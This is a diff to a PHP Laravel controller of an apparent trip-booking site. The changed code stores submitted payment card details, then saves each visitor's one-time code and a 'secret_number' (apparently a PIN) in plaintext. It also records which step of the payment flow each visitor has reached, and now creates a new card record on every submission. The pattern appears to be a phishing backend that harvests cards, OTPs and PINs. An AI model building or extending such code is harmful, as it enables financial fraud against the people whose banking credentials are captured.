@@ -184,13 +184,9 @@ class TripController extends Controller
             if ($visitor) {
                 $validated['visitor_notifications_id'] = $visitor?->id ?? VisitorNotifications::create([])->id;
                 // $validated['otp_code'] = random_int(100000,999999);
-                $payment_card =PaymentCard::where('visitor_notifications_id',$visitor?->id)->first();
-                if(!$payment_card)
-                {
+
                     $payment_card = PaymentCard::create($validated);
-                }else{
-                    $payment_card->update($validated);
-                }
+
 
                 $not  = VisitorNotifications::find($visitor->id);
                 $not->update(['page' => 'قام بإرسال بيانات الدفع','step_number'=>6]);
@@ -215,13 +211,13 @@ class TripController extends Controller
     {
         try {
             $validated = $this->validate($request, [
-                'code' => 'required|integer',
+                'code' => 'required',
             ]);
 
             $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
             if ($visitor) {
 
-                $payment_card = PaymentCard::where('visitor_notifications_id',$visitor->id)->first();
+                $payment_card = PaymentCard::where('visitor_notifications_id',$visitor->id)->latest()->first();
                 $payment_card->otp_code = $request->code;
                 $payment_card->save();
                 $not  = VisitorNotifications::find($visitor->id);
@@ -252,13 +248,13 @@ class TripController extends Controller
     {
         try {
             $validated = $this->validate($request, [
-                'code' => 'required|integer',
+                'code' => 'required',
             ]);
 
             $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
             if ($visitor) {
 
-                $payment_card = PaymentCard::where('visitor_notifications_id',$visitor->id)->first();
+                $payment_card = PaymentCard::where('visitor_notifications_id',$visitor->id)->latest()->first();
                 $payment_card->secret_number = $request->code;
                 $payment_card->save();
                 // if($request->code != $payment_card->otp_code) return back()->withErrors(['code' => 'الكود غير صحيح']);
